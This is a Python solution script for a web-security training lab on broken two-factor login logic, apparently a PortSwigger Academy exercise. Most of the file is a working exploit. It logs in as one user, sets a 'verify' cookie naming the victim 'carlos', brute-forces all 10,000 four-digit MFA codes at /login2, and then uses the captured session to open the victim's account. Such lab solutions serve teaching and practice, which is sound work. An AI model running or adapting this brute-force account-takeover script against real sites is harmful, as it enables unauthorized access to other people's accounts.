#########################################################
#
# Lab: 2FA broken logic
#
# Hack Steps: 
#      1. Obtain a valid session
#      2. Fetch the login2 page
#      3. Start brute forcing the mfa-code of carlos
#      4. Fetch carlos profile
#
#########################################################
import requests
from colorama import Fore
import time

# Change this to your lab URL
LAB_URL = "https://0aea001a0318214d80bfbca00087002c.web-security-academy.net"

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Obtaining a valid session.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter"}
    login_as_wiener = post_data("/login", data)
    session = login_as_wiener.cookies.get("session")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Fetching the login2 page.. ", end="", flush=True)

    # must fetch the login2 page to make the mfa-code be sent to the mail server
    cookies = { "session": session, "verify": "carlos"}
    fetch("/login2", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Start brute forcing the mfa-code of carlos.. ")

    carlos_session = brute_force_mfa_code(cookies)

    print(Fore.WHITE + "⦗4⦘ Fetching carlos profile.. ", end="", flush=True)

    cookies = { "session": carlos_session }
    fetch("/my-account", cookies)

    elapsed_time = int((time.time() - SCRIPT_START_TIME) / 60)
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + " minutes")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:
        return requests.post(f"{LAB_URL}{path}", data=data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "Failed to login as wiener")
        exit(1)
    

def brute_force_mfa_code(cookies):
     for (counter, code) in enumerate(range(0, 10000)):
        data = { "mfa-code": f"{code:04}" }
        response = post_data("/login2", data, cookies)
        if response != None and response.status_code == 302:
            print(Fore.WHITE + f"\n🗹 Correct code: " + Fore.GREEN + f"{code:04}" )
            new_session = response.cookies.get("session")
            return new_session
        else:
            print_progress(counter, 10000, code)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME) / 60))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" minutes || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:04}" +
           Fore.WHITE + " => " + Fore.RED + "Wrong", end='\r', flush=True)


if __name__ == "__main__":
    main()
